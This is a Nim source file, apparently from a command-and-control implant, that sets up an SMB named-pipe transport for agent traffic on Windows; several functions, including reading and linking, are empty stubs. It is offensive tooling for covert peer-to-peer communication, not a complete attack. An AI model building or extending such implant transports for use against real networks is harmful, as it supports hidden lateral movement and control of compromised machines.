when defined(TRANSPORT_SMB):

    import winim/lean
    import system
    import ../../utils/io
    import ../../../common/[types, utils]

    const PIPE_BUFFER_MAX = 0x10000 # 65536 

    type 
        SMB_PIPE_SEC_ATTR = object 
            Sid: PSID 
            SidLow: PSID 
            SAcl: PACL 
            SecDec: PSECURITY_DESCRIPTOR
        
        PSMB_PIPE_SEC_ATTR = ptr SMB_PIPE_SEC_ATTR

    #[
        Helper functions
    ]#
    proc pipeWrite*(hPipe: HANDLE, data: seq[byte]): bool = 
        var
            dwBytesWritten: DWORD = 0
            dwTotal: DWORD = 0

        while dwTotal < cast[DWORD](data.len()): 
            if WriteFile(hPipe, cast[LPCVOID](addr data[dwTotal]), min(cast[DWORD](data.len()) - dwTotal, PIPE_BUFFER_MAX), addr dwBytesWritten, NULL) == FALSE: 
                raise newException(CatchableError, GetLastError().getError())
            dwTotal += dwBytesWritten

        return true

    proc pipeRead*(hPipe: HANDLE, size: DWORD): seq[byte] = 
        var
            dwBytesRead: DWORD = 0
            dwTotal: DWORD = 0
        
        result = newSeq[byte](size)
        while dwTotal < size:
            if ReadFile(hPipe, cast[LPVOID](addr result[dwTotal]), min(size - dwTotal, PIPE_BUFFER_MAX), addr dwBytesRead, NULL) == FALSE:
                if GetLastError() != ERROR_MORE_DATA:
                    raise newException(CatchableError, GetLastError().getError())
            
            dwTotal += dwBytesRead


    proc openSmbSecurityAttributes(smbSecAttr: PSMB_PIPE_SEC_ATTR, secAttr: PSECURITY_ATTRIBUTES) = 
        discard 

    proc freeSmbSecurityAttributes(smbSecAttr: PSMB_PIPE_SEC_ATTR) = 
        discard

    proc createPipe*(ctx: AgentCtx) = 
        var 
            smbSecAttr: SMB_PIPE_SEC_ATTR
            secAttr: SECURITY_ATTRIBUTES  

        # Setup security attributes 
        openSmbSecurityAttributes(addr smbSecAttr, addr secAttr)

        ctx.transport.hPipe = CreateNamedPipeW(
            +$ctx.transport.pipe,                                       # Pipe Name
            PIPE_ACCESS_DUPLEX,                                         # Read/Write access
            PIPE_TYPE_MESSAGE or PIPE_READMODE_MESSAGE or PIPE_WAIT,    # Pipe modes (message, message-read, blocking)
            PIPE_UNLIMITED_INSTANCES,                                   # Maximum instances
            PIPE_BUFFER_MAX,                                            # Output buffer
            PIPE_BUFFER_MAX,                                            # Input buffer
            0,                                                          # Client timeout
            addr secAttr
        )
        freeSmbSecurityAttributes(addr smbSecAttr)

        if ctx.transport.hPipe == 0:
            raise newException(CatchableError, protect("Failed to create pipe."))

    proc link*() = 
        discard 

    proc unlink*() = 
        discard 

    # Required for all agent types
    proc smbWrite*(ctx: AgentCtx, data: seq[byte]): bool = 

        # Check if a pipe is already created, if not: create one
        if ctx.transport.hPipe == 0: 
            ctx.createPipe() 

        echo ctx.transport.hPipe
        if ConnectNamedPipe(ctx.transport.hPipe, NULL) == FALSE: 
            CloseHandle(ctx.transport.hPipe)
            raise newException(CatchableError, GetLastError().getError())



    proc smbRead*(ctx: AgentCtx): string = 
        discard 